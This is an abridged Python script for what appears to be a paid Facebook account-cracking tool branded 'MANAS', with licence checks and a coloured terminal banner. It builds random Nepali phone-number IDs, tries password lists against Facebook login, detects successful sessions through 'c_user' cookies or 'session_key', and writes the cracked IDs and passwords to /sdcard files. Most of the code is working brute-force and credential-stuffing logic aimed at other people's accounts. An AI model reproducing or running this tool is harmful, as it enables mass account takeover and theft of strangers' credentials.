...
""")
  ...
  print(f"")
  print(f"\x1b[1;92m   15 DAY 100 30 DAY 500  *** 2 DAY FREE TRYAL                                                                ");time.sleep (0.1) 
  print(f"")
  ...
  print ("")
  try:
    httpCaht = requests.get("https://github.com/Manashtamang1/Nepali/blob/main/Nepali.txt").text
    if id in httpCaht:
      ...
      os.system(f'xdg-open https://wa.me/+9779844255558?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m FACEBOOK  \033[38;5;196m:\x1b[38;5;46m मानस तामाङ　 ツ                 │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m GITHUB   \033[38;5;196m :\x1b[38;5;46m Manastamang1\033[38;5;196m-\x1b[38;5;46m404                       │
├─\033[38;5;196m[\x1b[38;5;46m=\033[38;5;196m]\x1b[38;5;46m TOOL      \033[38;5;196m:\x1b[38;5;46m PAID TOOL              │
...
def manu():
    mahdix.clear()
    print(logo)
    print(f'{W}[1]{Y} Ramdom Np {Cy}  [V0.1]')
...
def randombd():
    mahdix.clear()
    print(logo)
    print(f'{Y}[√] NP CODE : {G}[{R}9811{Bl} 9817 {Cy}9820{W} 9810{R} 9840{G} 9816 {Y}9808{Cy}]')
    ...
    print(mahdix.linex())
    print(f'{W}[1]{Or} Method {G}1')
    print(f'{W}[2]{Or} Method {G}2')
...
def file():
    ...
    print(f"\r{Y}ON{W}/{G}OFF {Y}FLIGHT (airplane){W} MODE \033[1;96m")
    print(mahdix.mahdilinx())
    ...
    print('Ok Ids Saved in /MANAS-OK.txt')
    print('Cp Ids Saved in /TAMANG-CP.txt')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            sys.stdout.write(f'\r\r {random.choice(mahdix.mycolor)}[{random.choice(mahdix.mycolor)}={random.choice(mahdix.mycolor)}]~[{random.choice(mahdix.mycolor)}MANAS{W}]~[{random.choice(mahdix.mycolor)}OK|CP{random.choice(mahdix.mycolor)}{random.choice(mahdix.mycolor)}]~[{len(cracked)}]~[{random.choice(mahdix.mycolor)}{tl}]~[{random.choice(mahdix.mycolor)}{G}{random.choice(mahdix.mycolor)}{len(oks)}{W}|{random.choice(mahdix.mycolor)}{R}{random.choice(mahdix.mycolor)}{len(cps)}{W}{random.choice(mahdix.mycolor)}] ');sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\r\033[1;32m[MANAS-OK💚] \033[1;32m'+cid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('/sdcard/MANAS-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                cid = coki[24:39]
                if 'y' in madhi_cp:
                    print('\r\r\33[1;30m[TAMANG-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/TAMANG-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        ...
        for pw in pwx:
            ...
            if 'session_key' in responce_json:
                ...
                if uidX not in oks:
                    ...
                    print(f'{G}PASS   : {W}{pw}')
                    open('/sdcard/MANAS-OK.txt', 'a').write(uidX+'|'+pw+'\n')
                    if 'y' in mahdi_coki:
                ...
                if uid not in cps:
                    if 'y' in madhi_cp:
                        print(f'\r{R}[TAMANG-CP] {uid}  | {pw} {W}')
                        open('/sdcard/TAMANG-CP.txt', 'a').write(uid+'|'+pw+'\n')
                    cps.append(uid)
            else:continue
        cracked.append(uid)
